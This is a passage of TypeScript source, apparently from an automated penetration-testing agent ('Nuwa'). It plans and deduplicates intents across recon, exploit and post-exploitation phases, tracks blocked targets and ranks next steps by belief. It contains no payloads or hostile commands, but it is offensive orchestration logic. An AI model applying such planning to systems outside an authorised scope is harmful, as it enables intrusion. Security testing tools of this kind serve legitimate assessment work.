/**
 * 女娲 v6.0 图规划、阶段种子、表面分域去重与不确定性感知信念前沿搜索引擎接线层。
 *
 * 约束：纯底层模块，严禁运行时 `import "./nuwa"`、`import "./graph"` 或 `import "./graph-commands"`。
 */
import { existsSync, readFileSync } from "node:fs";
import { join, resolve } from "node:path";
import {
	PHASE_ORDER,
	type AttemptedEntry,
	type AutoPlanResult,
	type Cfg,
	type ExpansionResult,
	type Fact,
	type FactKind,
	type FrontierItem,
	type Intent,
	type Mode,
	type NuwaState,
	type Phase,
	type PlanRejectReason,
	type RejectedIntentEntry,
	type Runtime,
	type Seed,
	type SurfaceDomain,
} from "./types";
import {
	atomicWrite,
	getAgentHome,
	getLoadedStateRoot,
	nextIntentId,
	normOneLine,
	nowIso,
	readCfg,
	sha,
} from "./storage";
import {
	buildProfileFallbackIntent,
	buildReflectIntentSpec,
	deriveKbIntents,
	deriveProfileIntents,
	getProfile,
	isLocalAuditProject,
} from "./profiles";
import { defaultScopeForTarget, isHostInScope } from "./scope";
import { canonicalAutoKey, enrichmentRulesForToolchain, pickAuto } from "./autoexec";
import {
	computeExperiencePriorityBoost,
	extractStateTechStack,
	kbLookupSafe,
	type KbLookupKind,
} from "./kb";
import { loadSessionVault } from "./session-vault";
import { syncAssetsFromFacts, synthesizeCrossFactHypotheses } from "./hypothesis";
import { resolveReportPhaseTransition } from "./reincarnate";
import {
	computeBetaPosterior,
	initBeliefGraphFromState,
	rankFrontierByBelief,
	recommendSearchPivot,
	type BeliefGraph,
	type SearchPivotRecommendation,
} from "./belief-search";

export function kbLookup(query: string, kind: KbLookupKind, limit = 5): string {
	return kbLookupSafe(query, kind, limit, { agentHome: getAgentHome() });
}

// ============================================================================
// v6.0 信念图内存缓存与持久化辅助（frontierList 纯只读不写盘）
// ============================================================================

const stateBeliefCache = new WeakMap<NuwaState, BeliefGraph>();

export function beliefGraphPath(root: string): string {
	return join(resolve(root), ".nuwa", "belief-graph.json");
}

export function attachBeliefGraphCache(st: NuwaState, graph: BeliefGraph): void {
	stateBeliefCache.set(st, graph);
}

export function getAttachedBeliefGraph(st: NuwaState): BeliefGraph | undefined {
	return stateBeliefCache.get(st);
}

export function loadBeliefGraphReadOnly(root: string): BeliefGraph | null {
	const bp = beliefGraphPath(root);
	if (!existsSync(bp)) return null;
	try {
		const parsed = JSON.parse(readFileSync(bp, "utf8")) as BeliefGraph;
		if (parsed && typeof parsed === "object" && parsed.nodes && typeof parsed.nodes === "object") {
			return parsed;
		}
	} catch {
		/* 忽略损坏或并发读取异常 */
	}
	return null;
}

export function loadOrInitBeliefGraph(root: string | undefined, st: NuwaState): BeliefGraph {
	const cached = stateBeliefCache.get(st);
	const effRoot = root || getLoadedStateRoot(st);
	const disk = effRoot ? loadBeliefGraphReadOnly(effRoot) : null;
	const existing = disk ?? cached;
	const graph = mergeWithDiskBeliefGraph(st, existing ?? undefined);
	stateBeliefCache.set(st, graph);
	return graph;
}

/**
 * 纯只读解析当前状态的信念图（优先命中内存缓存，未命中时从 root 或 loadState 绑定的目录只读加载 .nuwa/belief-graph.json，严禁写盘）。
 */
function mergeWithDiskBeliefGraph(st: NuwaState, existing?: BeliefGraph): BeliefGraph {
	const graph = initBeliefGraphFromState(st, existing);
	if (!existing?.nodes) return graph;
	for (const [id, node] of Object.entries(graph.nodes)) {
		const prev = existing.nodes[id];
		if (!prev) continue;
		if (prev.pruned) {
			node.pruned = true;
			if (!node.pruneReason && prev.pruneReason) node.pruneReason = prev.pruneReason;
		}
		if (typeof prev.breakthroughBoost === "number" && prev.breakthroughBoost > node.breakthroughBoost) {
			node.breakthroughBoost = prev.breakthroughBoost;
		}
		if (typeof prev.observations === "number" && prev.observations > node.observations) {
			node.observations = prev.observations;
		}
		// 兼容外部或测试直接指定 posterior 的持久化信念节点（除非底层事实已被明确 rejected）
		const srcFact = node.kind === "fact" ? st.facts?.[node.sourceId] : undefined;
		if (
			srcFact?.verifyStage !== "rejected" &&
			typeof prev.posterior === "number" &&
			Number.isFinite(prev.posterior) &&
			prev.posterior > 0 &&
			prev.posterior < 1 &&
			Math.abs(prev.posterior - computeBetaPosterior(prev.alpha, prev.beta)) > 1e-4
		) {
			const weight = Math.max(2, (prev.alpha || 1) + (prev.beta || 1));
			node.alpha = prev.posterior * weight;
			node.beta = (1 - prev.posterior) * weight;
			node.posterior = prev.posterior;
		}
	}
	return graph;
}

export function resolveBeliefGraphForRead(st: NuwaState, root?: string): BeliefGraph {
	const cached = stateBeliefCache.get(st);
	if (cached) return cached;
	const effRoot = root || getLoadedStateRoot(st);
	const disk = effRoot ? loadBeliefGraphReadOnly(effRoot) : null;
	const graph = mergeWithDiskBeliefGraph(st, disk ?? undefined);
	stateBeliefCache.set(st, graph);
	return graph;
}

export function saveBeliefGraph(root: string, st: NuwaState, graph: BeliefGraph): void {
	stateBeliefCache.set(st, graph);
	atomicWrite(beliefGraphPath(root), `${JSON.stringify(graph, null, 2)}\n`);
}

function isBeliefSearchEnabled(): boolean {
	return (process.env.NUWA_BELIEF_SEARCH ?? "1").trim() !== "0";
}

// ============================================================================
// 表面分域、规范化三元组去重与已尝试冷却过滤
// ============================================================================

const DEFAULT_NOVELTY_THRESHOLD = 8;
const DEFAULT_BLOCKED_COOLDOWN_MS = 300_000;

export function readEnvCooldownMs(cfg?: Partial<Cfg>): number {
	if (typeof cfg?.blockedCooldownMs === "number" && Number.isFinite(cfg.blockedCooldownMs) && cfg.blockedCooldownMs >= 0) {
		return cfg.blockedCooldownMs;
	}
	const raw = process.env.NUWA_BLOCKED_COOLDOWN_MS;
	if (raw !== undefined && raw.trim() !== "") {
		const n = Number(raw);
		if (Number.isFinite(n) && n >= 0) return n;
	}
	return DEFAULT_BLOCKED_COOLDOWN_MS;
}

export function readNoveltyThreshold(cfg?: Partial<Cfg>): number {
	if (
		typeof cfg?.noveltyStallThreshold === "number" &&
		Number.isFinite(cfg.noveltyStallThreshold) &&
		cfg.noveltyStallThreshold >= 1
	) {
		return Math.floor(cfg.noveltyStallThreshold);
	}
	const raw = process.env.NUWA_NOVELTY_STALL_THRESHOLD;
	if (raw !== undefined && raw.trim() !== "") {
		const n = Number(raw);
		if (Number.isFinite(n) && n >= 1) return Math.floor(n);
	}
	return DEFAULT_NOVELTY_THRESHOLD;
}

/** 规范化目标键（#21, #43）：统一处理路径尾斜杠/查询串排序、host:port/tcp 与 URL 默认端口。 */
export function normalizeTargetKey(raw: string, defaultHost?: string): string {
	const trimmed = (raw ?? "").trim();
	if (!trimmed) return defaultHost ? defaultHost.toLowerCase() : "/";

	const prefixMatch = /^(port|path|host):(.*)$/i.exec(trimmed);
	const explicitDomain = prefixMatch ? (prefixMatch[1]!.toLowerCase() as SurfaceDomain) : undefined;
	const body = (prefixMatch ? prefixMatch[2]! : trimmed).trim();
	if (!body) return defaultHost ? defaultHost.toLowerCase() : "/";

	const normPathAndQuery = (rawPath: string): string => {
		const hashIdx = rawPath.indexOf("#");
		const noHash = hashIdx >= 0 ? rawPath.slice(0, hashIdx) : rawPath;
		const qIdx = noHash.indexOf("?");
		const pathOnly = (qIdx >= 0 ? noHash.slice(0, qIdx) : noHash).replace(/\/{2,}/g, "/");
		const cleanPath = pathOnly.length > 1 ? pathOnly.replace(/\/+$/, "") : pathOnly || "/";
		if (qIdx < 0) return cleanPath;
		const params = new URLSearchParams(noHash.slice(qIdx + 1));
		params.sort();
		const qs = params.toString();
		return qs ? `${cleanPath}?${qs}` : cleanPath;
	};

	if (body.startsWith("/") || explicitDomain === "path") {
		const ensured = body.startsWith("/") ? body : `/${body}`;
		return normPathAndQuery(ensured);
	}

	const portMatch = /^(?:([a-zA-Z0-9.-]+):)?(\d{1,5})(?:\/(?:tcp|udp))?$/i.exec(body);
	if (portMatch) {
		const hostPart = (portMatch[1] || defaultHost || "").toLowerCase();
		return hostPart ? `${hostPart}:${portMatch[2]}` : `port:${portMatch[2]}`;
	}

	if (/^https?:\/\//i.test(body)) {
		try {
			const u = new URL(body);
			const host = u.hostname.toLowerCase();
			const isDefaultPort =
				!u.port ||
				(u.protocol === "http:" && u.port === "80") ||
				(u.protocol === "https:" && u.port === "443");
			const portSuffix = isDefaultPort ? "" : `:${u.port}`;
			const pq = normPathAndQuery(`${u.pathname}${u.search}`);
			if (pq !== "/") {
				if (defaultHost && host === defaultHost.toLowerCase() && isDefaultPort) {
					return pq;
				}
				return `${host}${portSuffix}${pq}`;
			}
			return `${host}${portSuffix}`;
		} catch {
			return body.toLowerCase();
		}
	}

	const slashIdx = body.indexOf("/");
	if (slashIdx > 0 && !/^\d+\/(?:tcp|udp)$/i.test(body)) {
		const hostPart = body.slice(0, slashIdx).toLowerCase().replace(/:(?:80|443)$/, "");
		const pq = normPathAndQuery(body.slice(slashIdx));
		if (defaultHost && hostPart === defaultHost.toLowerCase()) {
			return pq;
		}
		return `${hostPart}${pq}`;
	}

	return body.toLowerCase().replace(/\/+$/, "");
}

/** 显式推断目标键所属的攻击面分域（#25）："port" | "path" | "host"。 */
export function inferSurfaceDomain(targetKey: string): SurfaceDomain {
	const raw = (targetKey ?? "").trim();
	if (!raw) return "host";
	if (/^port:/i.test(raw)) return "port";
	if (/^path:/i.test(raw)) return "path";
	if (/^host:/i.test(raw)) return "host";

	if (raw.startsWith("/")) return "path";

	if (/^https?:\/\//i.test(raw)) {
		try {
			const u = new URL(raw);
			if ((u.pathname && u.pathname !== "/") || u.search) return "path";
			if (u.port) return "port";
			return "host";
		} catch {
			/* fallthrough */
		}
	}

	if (/^(?:[a-zA-Z0-9.-]+:)?\d{1,5}(?:\/(?:tcp|udp))?$/i.test(raw)) {
		return "port";
	}

	if (raw.includes("/") && !/^\d{1,5}\/(?:tcp|udp)$/i.test(raw)) {
		return "path";
	}

	return "host";
}

/** 跨层派生校验（#25）：从某一 surfaceDomain 派生另一 surfaceDomain 时，必须携带有效非证伪的显式前置事实。 */
export function canDeriveCrossSurface(
	st: NuwaState,
	fromDomain: SurfaceDomain | undefined,
	toDomain: SurfaceDomain | undefined,
	fromFactIds: string[],
): boolean {
	if (!fromDomain || !toDomain || fromDomain === toDomain) return true;
	const validFacts = (fromFactIds ?? [])
		.map((fid) => st.facts[fid])
		.filter((f): f is Fact => Boolean(f) && f.kind !== "blocked" && f.verifyStage !== "rejected");
	if (validFacts.length === 0) return false;
	// 端口层 -> 路径层：必须有证明 HTTP/Web 端点或服务可达的事实，纯关闭端口或无关事实不可跨层派生路径
	if (fromDomain === "port" && toDomain === "path") {
		return validFacts.some((f) => {
			if (f.kind === "endpoint" || f.kind === "cred" || f.kind === "vuln" || f.kind === "loot") return true;
			if (f.kind === "service") {
				const blob = `${f.title} ${f.detail} ${f.output ?? ""} ${f.meta?.server ?? ""}`;
				return (
					(typeof f.meta?.status === "number" && f.meta.status > 0) ||
					(f.meta?.paths?.length ?? 0) > 0 ||
					/\b(?:http|https|html|nginx|apache|caddy|iis|express|nextjs|tomcat|jetty|werkzeug|uvicorn|gunicorn|200|301|302|401|403|404|405)\b/i.test(blob)
				);
			}
			return false;
		});
	}
	// 路径层 -> 端口层：必须有显式发现新主机资产或端口服务的事实（禁止路径 403 后无依据回头重扫死端口）
	if (fromDomain === "path" && toDomain === "port") {
		return validFacts.some((f) => f.kind === "asset" || f.kind === "service" || f.kind === "cred" || f.kind === "vuln");
	}
	return true;
}

/** 自动推断意图的期望事实类型 expectedKind（#29, #43：优先显式声明、证据契约、结构化规则键与阶段语义，避免泛化标题词污染三元组）。 */
export function inferExpectedKind(spec: {
	key?: string;
	phase?: Phase;
	title?: string;
	detail?: string;
	expectedKind?: FactKind;
}): FactKind {
	if (spec.expectedKind) return spec.expectedKind;
	const detail = spec.detail ?? "";
	const m = /证据\s*[:：]\s*kind\s*=\s*(target|asset|service|endpoint|cred|vuln|flag|loot|note)\b/i.exec(detail);
	if (m) return m[1]!.toLowerCase() as FactKind;

	const canonKey = (spec.key ?? "").replace(/^e\d+:/i, "").toLowerCase();
	if (canonKey.startsWith("svc:") || canonKey.endsWith(":http") || canonKey.endsWith(":ports")) return "service";
	if (canonKey.startsWith("san:")) return "asset";
	if (canonKey.startsWith("enum:")) return "service";
	if (canonKey.startsWith("ep:") || canonKey.startsWith("exp:") || canonKey.startsWith("verify-vuln:")) return "vuln";
	if (canonKey.startsWith("reuse:") || canonKey.endsWith(":creds")) return "cred";
	if (canonKey.startsWith("pivot:") || canonKey.endsWith(":loot")) return "loot";
	if (canonKey.endsWith(":flag")) return "flag";
	if (canonKey.startsWith("loot:") || canonKey.startsWith("reflect:") || canonKey.startsWith("report:")) return "note";
	if (canonKey.startsWith("surface:") || canonKey.endsWith(":dirs") || canonKey.endsWith(":tlsjs")) return "endpoint";

	if (spec.phase) {
		switch (spec.phase) {
			case "recon":
				return "service";
			case "surface":
				return "endpoint";
			case "vuln":
			case "exploit":
				return "vuln";
			case "post":
				return "loot";
			case "report":
				return "note";
		}
	}

	const title = (spec.title ?? "").toLowerCase();
	if (/\bflag\b/.test(title)) return "flag";
	if (/(sql\s*注入|sqli|xss|ssti|ssrf|rce|命令注入|路径穿越|lfi|越权|idor|绕过|漏洞|cve-|审计)/i.test(title)) return "vuln";
	if (/(凭据|口令|token|cookie|cred)/i.test(title)) return "cred";
	if (/(端口|nmap|服务枚举|服务深挖|存活)/i.test(title)) return "service";
	if (/(路由|目录|接口|api|endpoint|爬取|参数)/i.test(title)) return "endpoint";
	if (/(子域|虚拟主机|san|资产)/i.test(title)) return "asset";

	return "note";
}

/** 从意图 key / title / detail 中提取目标标识并规范化（#21, #25, #43）。 */
export function extractIntentTargetKey(
	spec: { key?: string; title?: string; detail?: string; targetKey?: string; phase?: Phase },
	defaultHost = "",
): string {
	if (spec.targetKey && spec.targetKey.trim()) {
		return normalizeTargetKey(spec.targetKey, defaultHost);
	}
	const rawKey = (spec.key ?? "").replace(/^e\d+:/i, "");
	if (rawKey.startsWith("svc:")) {
		const port = rawKey.split(":")[2];
		if (port) return normalizeTargetKey(`${defaultHost || "port"}:${port}`, defaultHost);
	}
	if (rawKey.startsWith("ep:")) {
		const parts = rawKey.split(":");
		if (parts.length >= 3) return normalizeTargetKey(parts.slice(2).join(":"), defaultHost);
	}
	if (rawKey.startsWith("san:")) {
		const dom = rawKey.split(":").slice(2).join(":");
		if (dom) return normalizeTargetKey(dom, defaultHost);
	}

	const blob = `${spec.title ?? ""}\n${spec.detail ?? ""}`;
	const urlHit = blob.match(/https?:\/\/[^\s"'`）)，。；;、<>]+/i)?.[0];
	if (urlHit) {
		return normalizeTargetKey(urlHit.replace(/[.,;:!?]+$/, ""), defaultHost);
	}
	const hostPortHit = blob.match(/\b([a-zA-Z0-9](?:[a-zA-Z0-9.-]*[a-zA-Z0-9])?:\d{1,5})\b/)?.[1];
	if (hostPortHit) {
		return normalizeTargetKey(hostPortHit, defaultHost);
	}
	const portProtoHit = blob.match(/\b(\d{1,5}\/(?:tcp|udp))\b/i)?.[1];
	if (portProtoHit) {
		return normalizeTargetKey(portProtoHit, defaultHost);
	}
	const pathHit = (spec.title ?? "").match(/(?:^|[\s"'(:])(\/[A-Za-z0-9._~:/?=&%-]{1,120})/)?.[1]
		?? (spec.detail ?? "").match(/(?:^|[\s"'(:])(\/[A-Za-z0-9._~:/?=&%-]{1,120})/)?.[1];
	if (pathHit && !pathHit.startsWith("//") && !pathHit.startsWith("/tmp/") && !pathHit.startsWith("/usr/") && !pathHit.startsWith("/etc/") && !pathHit.startsWith("/var/")) {
		return normalizeTargetKey(pathHit, defaultHost);
	}
	if (rawKey && !rawKey.startsWith("custom:")) {
		return `seed:${rawKey}`;
	}
	return defaultHost ? defaultHost.toLowerCase() : "/";
}

function normalizeHintForHash(rawHint: string): string {
	return rawHint
		.replace(/\bf\d{3,}\b/g, "<fact>")
		.replace(/\bi\d{3,}\b/g, "<intent>")
		.replace(/https?:\/\/[^\s"'`]+/gi, "<url>")
		.replace(/\s+/g, " ")
		.trim()
		.toLowerCase();
}

/**
 * 构建规划/展图的规范化三元组去重键 (expectedKind, normalizeTargetKey(target), hintHash)（#43）。
 */
export function buildIntentDedupKey(
	spec: {
		expectedKind?: FactKind;
		targetKey?: string;
		target?: string;
		hint?: string;
		detail?: string;
		title?: string;
		phase?: Phase;
		key?: string;
		surfaceDomain?: SurfaceDomain;
	},
	defaultHost = "",
): {
	dedupKey: string;
	expectedKind: FactKind;
	targetKey: string;
	surfaceDomain: SurfaceDomain;
	hintHash: string;
} {
	const expectedKind = inferExpectedKind(spec);
	const targetKey = spec.target
		? normalizeTargetKey(spec.target, defaultHost)
		: extractIntentTargetKey(spec, defaultHost);
	const surfaceDomain = spec.surfaceDomain ?? inferSurfaceDomain(targetKey.startsWith("seed:") ? (defaultHost || "/") : targetKey);

	// 对内置结构化规则（如 svc:<fid>:<port> / ep:<fid>:<path> / san:<fid>:<dom>）使用稳定的动作族标识，消除 <fid> 噪声
	const rawKey = (spec.key ?? "").replace(/^e\d+:/i, "");
	let semanticHintSource: string;
	if (spec.hint !== undefined && spec.hint.trim() !== "") {
		semanticHintSource = normalizeHintForHash(spec.hint);
	} else if (/^(?:svc|ep|san):/.test(rawKey)) {
		semanticHintSource = rawKey.split(":")[0]!;
	} else if (spec.detail && spec.detail.trim() !== "") {
		semanticHintSource = normalizeHintForHash(spec.detail);
	} else {
		semanticHintSource = normalizeHintForHash(spec.title ?? rawKey);
	}

	const hintHash = sha(semanticHintSource || "default", 10);
	const dedupKey = `${expectedKind}|${targetKey}|${hintHash}`;
	return { dedupKey, expectedKind, targetKey, surfaceDomain, hintHash };
}

function attemptRegistryKey(expectedKind: string, surfaceDomain: SurfaceDomain, targetKey: string): string {
	return `${expectedKind}|${surfaceDomain}|${targetKey}`;
}

export function recordAttemptedIntent(st: NuwaState, intent: Intent, status: "done" | "blocked"): void {
	const host = st.project?.host ?? "";
	const expectedKind = intent.expectedKind ?? inferExpectedKind(intent);
	const targetKey = intent.targetKey ? normalizeTargetKey(intent.targetKey, host) : extractIntentTargetKey(intent, host);
	const surfaceDomain = intent.surfaceDomain ?? inferSurfaceDomain(targetKey.startsWith("seed:") ? (host || "/") : targetKey);
	const regKey = attemptRegistryKey(expectedKind, surfaceDomain, targetKey);
	if (!st.runtime.attemptedKeys) st.runtime.attemptedKeys = {};
	const prev = st.runtime.attemptedKeys[regKey];
	const mergedFrom = [...new Set([...(prev?.from ?? []), ...(intent.from ?? [])])];
	st.runtime.attemptedKeys[regKey] = {
		key: regKey,
		expectedKind,
		targetKey,
		surfaceDomain,
		status,
		at: intent.doneAt ?? nowIso(),
		from: mergedFrom,
	};
}

function hasUnlockingPrerequisiteFacts(
	st: NuwaState,
	lastAttemptAt: string,
	recordedFrom: string[],
	candidateFrom: string[],
	strictAutoDerive = false,
): boolean {
	const recordedSet = new Set(recordedFrom);
	const lastTs = Date.parse(lastAttemptAt);

	// 检查显式传入的 candidateFrom 中是否包含上次尝试时尚未关联的有效新前置事实
	for (const fid of candidateFrom) {
		const f = st.facts[fid];
		if (!f || f.kind === "blocked" || f.verifyStage === "rejected") continue;
		if (!recordedSet.has(fid)) {
			if (!strictAutoDerive) {
				return true;
			}
			// 自动派生（deriveFromFacts）场景：同质的 service/endpoint 重复发现不算新解锁条件，只有 cred/vuln/loot 等高阶新前置才解锁重测
			if (f.kind === "cred" || f.kind === "vuln" || f.kind === "loot") {
				return true;
			}
		}
	}

	// 全局检查：若在上次结案时间之后新增了有效凭据（cred），允许重测曾被 401/403 阻断的目标
	if (Number.isFinite(lastTs)) {
		for (const f of Object.values(st.facts)) {
			if (f.kind === "cred" && f.verifyStage !== "rejected") {
				const fTs = Date.parse(f.createdAt);
				if (Number.isFinite(fTs) && fTs > lastTs && !recordedSet.has(f.id)) {
					return true;
				}
			}
		}
	}
	return false;
}

/**
 * 已尝试过滤器 attempted(st, kind, targetKey, opts)（#21, #25）：
 * 覆盖 done 与 blocked 状态，严格按 surfaceDomain 隔离（端口 blocked 不污染路径），
 * 同键未传 force=true 且无新前置事实时返回 true 抑制重派生。
 */
export function attempted(
	st: NuwaState,
	kind: FactKind | string,
	targetKey: string,
	opts?: {
		force?: boolean;
		from?: string[];
		surfaceDomain?: SurfaceDomain;
		strictAutoDerive?: boolean;
	},
): boolean {
	if (opts?.force === true) return false;
	const host = st.project?.host ?? "";
	const normTarget = normalizeTargetKey(targetKey, host);
	const domain = opts?.surfaceDomain ?? inferSurfaceDomain(normTarget.startsWith("seed:") ? (host || "/") : normTarget);
	const regKey = attemptRegistryKey(kind, domain, normTarget);

	const regHit = st.runtime?.attemptedKeys?.[regKey];
	const matchingIntents = Object.values(st.intents ?? {}).filter((it) => {
		if (it.status !== "done" && it.status !== "blocked") return false;
		const itKind = it.expectedKind ?? inferExpectedKind(it);
		if (itKind !== kind) return false;
		const itTarget = it.targetKey ? normalizeTargetKey(it.targetKey, host) : extractIntentTargetKey(it, host);
		if (itTarget !== normTarget) return false;
		const itDomain = it.surfaceDomain ?? inferSurfaceDomain(itTarget.startsWith("seed:") ? (host || "/") : itTarget);
		return itDomain === domain;
	});

	if (!regHit && matchingIntents.length === 0) return false;

	const recordedFrom = new Set<string>(regHit?.from ?? []);
	let latestAt = regHit?.at ?? "";
	for (const it of matchingIntents) {
		for (const fid of it.from ?? []) recordedFrom.add(fid);
		const at = it.doneAt ?? it.createdAt;
		if (!latestAt || at > latestAt) latestAt = at;
	}

	if (
		hasUnlockingPrerequisiteFacts(
			st,
			latestAt,
			[...recordedFrom],
			opts?.from ?? [],
			Boolean(opts?.strictAutoDerive),
		)
	) {
		return false;
	}

	return true;
}

export const hasAttempted = attempted;

/** 检查目标键是否处于 blocked 冷却窗口内（#43, #25：按 surfaceDomain 隔离，端口不污染路径）。 */
export function isTargetInBlockedCooldown(
	st: NuwaState,
	targetKey: string,
	opts?: {
		surfaceDomain?: SurfaceDomain;
		cooldownMs?: number;
		now?: number;
		force?: boolean;
		from?: string[];
		strictAutoDerive?: boolean;
	},
): boolean {
	if (opts?.force === true) return false;
	const cooldownMs = opts?.cooldownMs ?? readEnvCooldownMs();
	if (cooldownMs <= 0) return false;
	const now = opts?.now ?? Date.now();
	const host = st.project?.host ?? "";
	const normTarget = normalizeTargetKey(targetKey, host);
	if (normTarget.startsWith("seed:")) return false;
	const domain = opts?.surfaceDomain ?? inferSurfaceDomain(normTarget);

	const blockedMatches = Object.values(st.intents ?? {}).filter((it) => {
		if (it.status !== "blocked") return false;
		const itTarget = it.targetKey ? normalizeTargetKey(it.targetKey, host) : extractIntentTargetKey(it, host);
		if (itTarget !== normTarget) return false;
		const itDomain = it.surfaceDomain ?? inferSurfaceDomain(itTarget);
		if (itDomain !== domain) return false;
		const blockedTs = Date.parse(it.doneAt ?? it.createdAt);
		return !Number.isFinite(blockedTs) || now - blockedTs < cooldownMs;
	});

	let regMatch: AttemptedEntry | undefined;
	for (const entry of Object.values(st.runtime?.attemptedKeys ?? {})) {
		if (entry.status !== "blocked") continue;
		if (entry.surfaceDomain !== domain || normalizeTargetKey(entry.targetKey, host) !== normTarget) continue;
		const ts = Date.parse(entry.at);
		if (!Number.isFinite(ts) || now - ts < cooldownMs) {
			regMatch = entry;
			break;
		}
	}

	if (blockedMatches.length === 0 && !regMatch) return false;

	const recordedFrom = new Set<string>(regMatch?.from ?? []);
	let latestAt = regMatch?.at ?? "";
	for (const it of blockedMatches) {
		for (const fid of it.from ?? []) recordedFrom.add(fid);
		const at = it.doneAt ?? it.createdAt;
		if (!latestAt || at > latestAt) latestAt = at;
	}

	if (
		hasUnlockingPrerequisiteFacts(
			st,
			latestAt,
			[...recordedFrom],
			opts?.from ?? [],
			Boolean(opts?.strictAutoDerive),
		)
	) {
		return false;
	}

	return true;
}

/** 计算重复尝试比率 repeatRatio = 1 - distinct/total（#21）。 */
export function computeRepeatRatio(st: NuwaState): { total: number; distinct: number; repeatRatio: number } {
	const host = st.project?.host ?? "";
	const intents = Object.values(st.intents ?? {});
	const sigs = intents.map((it) => {
		const k = it.expectedKind ?? inferExpectedKind(it);
		const t = it.targetKey ? normalizeTargetKey(it.targetKey, host) : extractIntentTargetKey(it, host);
		return `${k}|${t}`;
	});
	const seen = new Set(sigs);
	for (const entry of Object.values(st.runtime?.attemptedKeys ?? {})) {
		const sig = `${entry.expectedKind}|${normalizeTargetKey(entry.targetKey, host)}`;
		if (!seen.has(sig)) {
			sigs.push(sig);
			seen.add(sig);
		}
	}
	const total = Math.max(intents.length, sigs.length);
	if (total === 0) return { total: 0, distinct: 0, repeatRatio: 0 };
	const distinct = seen.size;
	return {
		total,
		distinct,
		repeatRatio: Math.max(0, Math.min(1, Number((1 - distinct / total).toFixed(4)))),
	};
}

// ============================================================================
// 自动封盘判定、收敛建议与语义停滞计数（联动信念收敛评估）
// ============================================================================

export interface SealRecommendation {
	recommend: boolean;
	shouldSeal: boolean;
	reason?: string;
	reasons: string[];
	searchPivot?: SearchPivotRecommendation;
}

/**
 * 自动封盘判定函数 shouldRecommendSeal(rtOrState, cfg)：
 * 当轮次达上限、成本/Token 超限、noveltyStall >= threshold，或完整状态下信念图判定负向收敛时建议封盘。
 */
export function shouldRecommendSeal(
	rtOrState: Runtime | NuwaState,
	cfg?: Partial<Cfg> & { maxCostUsd?: number; noveltyStallThreshold?: number },
	root?: string,
): SealRecommendation {
	const isFullState = Boolean(
		rtOrState && typeof rtOrState === "object" && "project" in rtOrState && "runtime" in rtOrState,
	);
	const rt: Runtime = isFullState ? (rtOrState as NuwaState).runtime : (rtOrState as Runtime);
	const effectiveCfg = { ...readCfg(), ...(cfg ?? {}) };
	const reasons: string[] = [];

	const turns = Math.max(Number(rt.totalTurns ?? 0), Number(rt.turns ?? 0));
	if (effectiveCfg.maxTurns > 0 && turns >= effectiveCfg.maxTurns) {
		reasons.push(`max_turns(${turns}>=${effectiveCfg.maxTurns})`);
	}

	const maxCostUsd =
		typeof effectiveCfg.maxCostUsd === "number" && Number.isFinite(effectiveCfg.maxCostUsd)
			? effectiveCfg.maxCostUsd
			: Number(process.env.NUWA_MAX_COST_USD ?? 0) || 0;
	const curCost = Number(rt.totalCostUsd ?? 0);
	if (maxCostUsd > 0 && curCost >= maxCostUsd) {
		reasons.push(`max_cost_usd(${curCost.toFixed(4)}>=${maxCostUsd})`);
	}

	const tokens = Math.max(Number(rt.totalTokens ?? 0) + Number(rt.tokens ?? 0), Number(rt.tokens ?? 0));
	if (effectiveCfg.maxTokens > 0 && tokens >= effectiveCfg.maxTokens) {
		reasons.push(`max_tokens(${tokens}>=${effectiveCfg.maxTokens})`);
	}

	const threshold = readNoveltyThreshold(effectiveCfg);
	const noveltyStall = Number(rt.noveltyStall ?? 0);
	if (noveltyStall >= threshold) {
		reasons.push(`novelty_stall(${noveltyStall}>=${threshold})`);
	}

	let searchPivot: SearchPivotRecommendation | undefined;
	if (isFullState && isBeliefSearchEnabled()) {
		try {
			const st = rtOrState as NuwaState;
			const graph = resolveBeliefGraphForRead(st, root);
			searchPivot = recommendSearchPivot(st, graph, { noveltyStallThreshold: threshold });
			if (
				searchPivot.recommendSeal &&
				(noveltyStall >= Math.max(2, Math.floor(threshold / 2)) || Number(rt.completionRejects ?? 0) >= 1)
			) {
				reasons.push(`belief_converged(${searchPivot.negativeSealConfidence.toFixed(2)})`);
			}
		} catch {
			/* 忽略信念收敛辅助计算异常 */
		}
	}

	const recommend = reasons.length > 0;
	return {
		recommend,
		shouldSeal: recommend,
		...(reasons[0] ? { reason: reasons[0] } : {}),
		reasons,
		...(searchPivot ? { searchPivot } : {}),
	};
}

export interface ConvergenceAdvice {
	active: boolean;
	rejects: number;
	recommendedAction: "continue" | "verify_candidates" | "report_and_seal";
	targetPhase?: Phase;
	forbidBlindRerun: boolean;
	message: string;
	searchPivot?: SearchPivotRecommendation;
}

/**
 * 当 rt.completionRejects >= 1 时生成策略收敛建议：
 * 引导转向 report / seal 收口（或仅完成既有 candidate 复验），融合信念图转向/剪枝建议，禁止原样重跑空转循环。
 */
export function buildConvergenceAdvice(
	stOrRt: NuwaState | Runtime,
	cfg?: Partial<Cfg>,
	root?: string,
): ConvergenceAdvice {
	const isFullState = Boolean(stOrRt && typeof stOrRt === "object" && "project" in stOrRt && "runtime" in stOrRt);
	const rt: Runtime = isFullState ? (stOrRt as NuwaState).runtime : (stOrRt as Runtime);
	const rejects = Number(rt.completionRejects ?? 0);
	if (rejects < 1) {
		return {
			active: false,
			rejects: 0,
			recommendedAction: "continue",
			forbidBlindRerun: false,
			message: "",
		};
	}

	const candidateIds = isFullState
		? Object.values((stOrRt as NuwaState).facts ?? {})
				.filter((f) => f.verifyStage === "candidate")
				.map((f) => f.id)
		: [];

	let searchPivot: SearchPivotRecommendation | undefined;
	if (isFullState && isBeliefSearchEnabled()) {
		try {
			const st = stOrRt as NuwaState;
			const graph = resolveBeliefGraphForRead(st, root);
			searchPivot = recommendSearchPivot(st, graph);
		} catch {
			/* ignore */
		}
	}

	if (candidateIds.length > 0) {
		return {
			active: true,
			rejects,
			recommendedAction: "verify_candidates",
			forbidBlindRerun: true,
			message: `策略收敛（completionRejects=${rejects}）：禁止原样重跑已探明攻击面；请先完成候选事实 [${candidateIds.join(", ")}] 的双盲独立复验，若驳回则立即转入 report 阶段并调用 sealEngagement 封盘收口。`,
			...(searchPivot ? { searchPivot } : {}),
		};
	}

	const sealRec = shouldRecommendSeal(stOrRt, cfg, root);
	const pivotHint = searchPivot?.topDirection
		? `（若仍有未探明高信息增益方向，仅允许核验 ${searchPivot.topDirection.intentId}: ${searchPivot.topDirection.title}）`
		: "";
	return {
		active: true,
		rejects,
		recommendedAction: "report_and_seal",
		targetPhase: "report",
		forbidBlindRerun: true,
